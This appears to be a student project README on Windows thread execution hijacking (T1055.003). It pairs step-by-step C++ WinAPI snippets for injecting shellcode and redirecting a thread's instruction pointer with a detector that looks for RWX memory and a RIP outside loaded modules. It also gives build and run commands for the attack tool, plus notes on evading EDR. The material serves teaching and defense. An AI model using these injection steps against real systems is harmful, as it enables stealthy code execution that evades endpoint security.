# ThreadHijacking
🧵 Windows x64 thread execution hijacking — suspend, redirect RIP, resume. Attack + defense detector. C++17 · WinAPI · T1055.003 · Educational only.
<!--
ThreadHijacking — README
AceX98 · Air University ·
-->

<div align="center">

```
████████╗██╗  ██╗██████╗ ███████╗ █████╗ ██████╗
╚══██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗
   ██║   ███████║██████╔╝█████╗  ███████║██║  ██║
   ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║██║  ██║
   ██║   ██║  ██║██║  ██║███████╗██║  ██║██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝

██╗  ██╗██╗     ██╗ █████╗  ██████╗██╗  ██╗██╗███╗  ██╗ ██████╗
██║  ██║██║     ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗ ██║██╔════╝
███████║██║     ██║███████║██║     █████╔╝ ██║██╔██╗██║██║  ███╗
██╔══██║██║██   ██║██╔══██║██║     ██╔═██╗ ██║██║╚████║██║   ██║
██║  ██║██║╚█████╔╝██║  ██║╚██████╗██║  ██╗██║██║ ╚███║╚██████╔╝
╚═╝  ╚═╝╚═╝ ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚══╝ ╚═════╝
```

![Status](https://img.shields.io/badge/Status-🚧_Work_In_Progress-F0A500?style=flat-square)
![Language](https://img.shields.io/badge/Language-C%2B%2B17-00599C?style=flat-square&logo=cplusplus)
![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0078D4?style=flat-square&logo=windows)
![MITRE](https://img.shields.io/badge/MITRE-T1055.003-FF6B6B?style=flat-square)
![University](https://img.shields.io/badge/Air_University-Cyber_Security-00D4FF?style=flat-square)

> **Thread Execution Hijacking — attacking an existing thread in a remote process and redirecting it to execute custom shellcode, with a companion detector that catches it.**

⚠️ *Built in an isolated lab VM for educational and research purposes only.*

> Code is being written module by module. README documents the full design upfront.

</div>

---

## What Is Thread Hijacking?

Classic DLL injection creates a **new remote thread** via `CreateRemoteThread()` — one of the most monitored WinAPI calls by EDR and AV tools. Thread hijacking avoids this entirely.

Instead of spawning a new thread, it **takes over an existing one**:

```
Target process (notepad.exe)
└── Thread 0x1A4  ← running normally
        │
        ▼  [SuspendThread]
        │
        ├── [GetThreadContext]   read current RIP register
        ├── [VirtualAllocEx]     allocate shellcode in target
        ├── [WriteProcessMemory] write shellcode into target
        ├── [SetThreadContext]   redirect RIP → shellcode
        │
        ▼  [ResumeThread]
        │
        shellcode executes inside the existing thread
        thread count never changes
```

From the OS perspective — the **same thread** that was running Notepad is now running your code. No new thread ever appears.

---

## Attack vs Defense

```
┌─────────────────────────────────────────────────────────────────┐
│                    THIS REPO — TWO SIDES                        │
├──────────────────────────┬──────────────────────────────────────┤
│  ATTACK                  │  DEFENSE                            │
│  src/attack/             │  src/defense/                       │
│                          │                                     │
│  Hijacker.cpp            │  Detector.cpp                       │
│  ├─ ProcessFinder        │  ├─ ThreadScanner                   │
│  ├─ ThreadFinder         │  ├─ ContextMonitor                  │
│  ├─ ShellcodeInjector    │  ├─ MemoryScanner                   │
│  └─ ContextHijacker      │  └─ SuspendDetector                 │
└──────────────────────────┴──────────────────────────────────────┘
```

---

## Repository Structure

```
ThreadHijacking/
├── src/
│   ├── attack/
│   │   ├── main.cpp              ← entry point + CLI
│   │   ├── ProcessFinder.h       ← find target PID by name
│   │   ├── ThreadFinder.h        ← enumerate threads of target
│   │   ├── ShellcodeInjector.h   ← VirtualAllocEx + WriteProcessMemory
│   │   └── ContextHijacker.h     ← GetThreadContext + SetThreadContext
│   └── defense/
│       ├── Detector.cpp          ← entry point for detector
│       ├── ThreadScanner.h       ← scan for hijacked threads
│       ├── MemoryScanner.h       ← find RWX memory regions
│       └── SuspendDetector.h     ← detect suspended thread anomalies
├── shellcode/
│   └── calc_shellcode.h          ← test shellcode (launches calc.exe)
├── docs/
│   ├── HOW_IT_WORKS.md           ← deep technical explanation
│   ├── DETECTION.md              ← how the defender catches it
│   └── MITRE.md                  ← T1055.003 mapping
├── .gitignore
├── LICENSE
└── README.md
```

---

## How It Works — Technical Deep Dive

### Step 1 — Find the target process
```cpp
// Enumerate all running processes via Toolhelp32 snapshot
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);

// Match by name (case-insensitive)
// Returns: target PID
```

### Step 2 — Find an existing thread in that process
```cpp
// Snapshot threads instead of processes
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te; te.dwSize = sizeof(te);

// Walk all threads on the system
// Filter: te.th32OwnerProcessID == targetPID
// Returns: first thread ID belonging to target
```

### Step 3 — Open and suspend the thread
```cpp
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTID);

// Pause execution — thread stops wherever it currently is
SuspendThread(hThread);
```

### Step 4 — Read the current CPU context
```cpp
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;  // capture all registers

// Snapshot the thread's register state
// Most important: ctx.Rip = current instruction pointer
GetThreadContext(hThread, &ctx);
```

### Step 5 — Allocate shellcode in target memory
```cpp
LPVOID shellcodeMem = VirtualAllocEx(
    hProcess,
    NULL,
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE   // RWX — readable, writeable, executable
);

// Write shellcode into that allocation
WriteProcessMemory(hProcess, shellcodeMem, shellcode, shellcodeSize, NULL);
```

### Step 6 — Redirect RIP to shellcode
```cpp
// Save original RIP so we can restore later (optional)
UINT_PTR originalRip = ctx.Rip;

// Point instruction pointer at our shellcode
ctx.Rip = (DWORD64)shellcodeMem;

// Apply the modified context back to the thread
SetThreadContext(hThread, &ctx);
```

### Step 7 — Resume the thread
```cpp
// Thread resumes — but now RIP points to our shellcode
// Shellcode executes inside the hijacked thread
ResumeThread(hThread);
```

---

## Why This Is Stealthier Than Classic Injection

| Factor | Classic DLL Injection | Thread Hijacking |
|--------|----------------------|-----------------|
| New thread created | ✅ Yes — easily spotted | ❌ No |
| `CreateRemoteThread` call | ✅ Yes — heavily monitored | ❌ No |
| DLL appears in module list | ✅ Yes | ❌ No (shellcode only) |
| Thread count changes | ✅ Yes | ❌ No |
| Detection difficulty | Easy for EDR | Harder |
| Stability risk | Low | Higher — hijacked thread may crash |

**MITRE ATT&CK:** T1055.003 — Thread Execution Hijacking

---

## Defense — How the Detector Works

The detector (`src/defense/`) scans for indicators of thread hijacking:

### Indicator 1 — RWX memory regions
```cpp
// Scan all memory regions in a process
// Flag any region with PAGE_EXECUTE_READWRITE protection
// Legitimate code is never RWX — only injected shellcode is
VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));
if (mbi.Protect == PAGE_EXECUTE_READWRITE) {
    // ALERT: suspicious RWX region found
}
```

### Indicator 2 — Thread RIP outside known modules
```cpp
// Get context of every thread in target process
GetThreadContext(hThread, &ctx);

// Check if RIP points inside a known loaded module
// If RIP is in an unrecognised memory region → hijacking likely
EnumProcessModules(hProcess, modules, sizeof(modules), &needed);
// compare ctx.Rip against module base+size ranges
```

### Indicator 3 — Abnormal thread suspension
```cpp
// Check suspension count of threads
// Legitimate threads are rarely suspended for long
// A thread suspended + context changed + resumed quickly = hijack pattern
```

### Indicator 4 — Shellcode signatures
```cpp
// Scan RWX memory regions for common shellcode bytes
// e.g. common x64 shellcode stubs start with:
// 0xfc 0x48 0x83 (cld; sub rsp)
// 0x90 (NOP sled)
```

---

## Detection Summary

```
┌─────────────────────────────────────────────────────────────────┐
│  DETECTOR ALERTS                                                │
├──────────────────────────────────┬──────────────────────────────┤
│  Indicator                       │  Confidence                  │
├──────────────────────────────────┼──────────────────────────────┤
│  RWX memory region found         │  Medium                      │
│  Thread RIP outside all modules  │  High                        │
│  Shellcode byte pattern in RWX   │  High                        │
│  Rapid suspend + context change  │  Medium                      │
│  All indicators combined         │  Very High                   │
└──────────────────────────────────┴──────────────────────────────┘
```

---

## Build

> ⚠️ Requires: Windows 10/11 x64 · MinGW g++ · Administrator · AV disabled · Isolated VM

```bash
# Compile attacker
x86_64-w64-mingw32-g++ -o ThreadHijacker.exe src/attack/main.cpp \
  -lkernel32 -lntdll -std=c++17

# Compile detector
x86_64-w64-mingw32-g++ -o Detector.exe src/defense/Detector.cpp \
  -lkernel32 -lpsapi -std=c++17

# Run attacker
.\ThreadHijacker.exe --target notepad.exe

# Run detector (on suspicious process)
.\Detector.exe --scan notepad.exe
```

---

## Related Projects

[![StealthRecon](https://img.shields.io/badge/→_StealthRecon-Classic_DLL_Injection-00D4FF?style=flat-square&logo=github&logoColor=black)](https://github.com/AceX98/StealthRecon)
[![ProcessInjection-Lab](https://img.shields.io/badge/→_ProcessInjection_Lab-All_Techniques-F0A500?style=flat-square&logo=github&logoColor=black)](https://github.com/AceX98/ProcessInjection-Lab)

---

## MITRE ATT&CK

| ID | Technique | Detail |
|----|-----------|--------|
| T1055.003 | Thread Execution Hijacking | Suspend → context modify → resume |
| T1055.001 | DLL Injection | See StealthRecon |
| T1106 | Native API | Direct WinAPI usage |

---

<div align="center">

*Research conducted in isolated lab VM · Educational purposes only*  
*Air University*

[![Email](https://img.shields.io/badge/Gmail-tuyhaseeb%40gmail.com-EA4335?style=flat-square&logo=gmail&logoColor=white)](mailto:tuyhaseeb@gmail.com)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Abdul_Haseeb-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/abdul-haseeb-03880a271)
[![Discord](https://img.shields.io/badge/Discord-AceX98-5865F2?style=flat-square&logo=discord&logoColor=white)](https://discord.com/users/735418037754265611)

</div>
